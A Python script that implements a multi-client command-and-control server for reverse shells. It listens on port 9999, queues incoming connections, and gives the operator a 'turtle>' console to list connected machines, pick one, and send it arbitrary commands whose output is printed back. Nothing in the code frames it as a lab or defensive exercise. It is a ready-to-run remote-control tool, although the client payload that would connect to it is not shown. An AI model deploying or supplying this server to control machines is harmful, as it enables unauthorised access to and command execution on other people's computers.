import socket
import threading
import sys
import time
from queue import Queue


# queue = Queue()

class Client:
    def __init__(self, conn, address):
        self.conn = conn
        self.host = address[0]
        self.port = address[1]


class MultiServer():
    def __init__(self, queue):
        self.host = ""
        self.port = 9999
        self.server_socket = None
        self.clients = []
        self.q = queue

    def socket_create(self):
        try:
            self.server_socket = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))

    def socket_bind(self):
        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
        except socket.error as msg:
            print("Socket Binding error: " + str(msg))

    def accept_connections(self):
        """ Disconnect all current connections """
        for c in self.clients:
            c.conn.close()
        del self.clients[:]

        """ Start accepting new connections """
        while True:
            try:
                conn, address = self.server_socket.accept()
                conn.setblocking(1)
                c = Client(conn, address)
                self.clients.append(c)
                self.q.put(c)
            except:
                print("Error accepting connection")

    def run(self):
        self.socket_create()
        self.socket_bind()
        self.accept_connections()


class Turtle:
    def __init__(self, queue):
        self.clients = []
        self.q = queue

    def run(self):
        while True:
            cmd = input("turtle> ")
            if cmd == "list":
                self.get_queued_clients()
                self.list_connections()
            elif cmd[0:7] == "select ":
                conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_command(conn)
            else:
                print("Command not recognized")

    def get_queued_clients(self):
        while not self.q.empty():
            self.clients.append(self.q.get())
            # self.q.task_done

    def list_connections(self):
        results = ""
        for i, client in enumerate(self.clients):
            try:
                client.conn.send(str.encode(" "))
                client.conn.recv(1024)
            except:
                del self.clients[i]
                continue
            results += str(i) + "   " + self.clients[i].host + "   " + str(self.clients[i].port) + "\n"
        print("----- Clients -----" + "\n" + results)

    def get_target(self, cmd):
        try:
            target = int(cmd[7:])
            client = self.clients[target]
            print("You are connected to " + self.clients[target].host)
            print(self.clients[target].host + "> ", end="")
            return client
        except:
            print("Not a valid selection")
            return None

    def send_target_command(self, client):
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0:
                    client.conn.send(str.encode(cmd))
                    client_response = str(client.conn.recv(20480), "utf-8")
                    print(client_response, end="")
                if cmd == "quit":
                    break
            except socket.error as msg:
                print("Connection was lost " + str(msg))
                break


def main():
    queue = Queue()
    server = MultiServer(queue)
    turtle = Turtle(queue)

    t1 = threading.Thread(target=server.run)
    t1.daemon = True
    t1.start()

    turtle.run()


main()
